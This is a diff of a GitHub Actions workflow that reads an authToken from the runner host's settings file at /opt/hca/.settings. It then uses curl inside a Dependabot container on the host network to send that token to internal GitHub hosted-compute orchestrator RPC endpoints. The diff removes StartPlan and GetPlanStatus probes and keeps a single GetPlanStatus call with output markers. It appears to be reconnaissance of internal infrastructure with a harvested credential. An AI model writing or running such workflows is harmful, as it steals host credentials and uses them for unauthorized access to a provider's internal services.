@@ -1,4 +1,4 @@
-name: eus-01 test
+name: Final
 on:
   push:
     branches: [master]
@@ -9,23 +9,6 @@ jobs:
     steps:
       - run: |
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          
-          # Try eus-01 explicitly (where we KNOW /v1/twirp works)
-          echo "=== StartPlan (eus-01) ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --connect-timeout 10 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test\"}' \
-              'https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan'
-          " 2>&1
-          
-          echo ""
-          echo "=== GetPlanStatus (eus-01) ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --connect-timeout 10 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test\"}' \
-              'https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
-          " 2>&1
+          echo "RESULT_START"
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "curl -sk --connect-timeout 10 -H 'Authorization: Bearer $TOK' -H 'Content-Type: application/json' -d '{\"planId\":\"test\"}' 'https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'"
+          echo "RESULT_END"
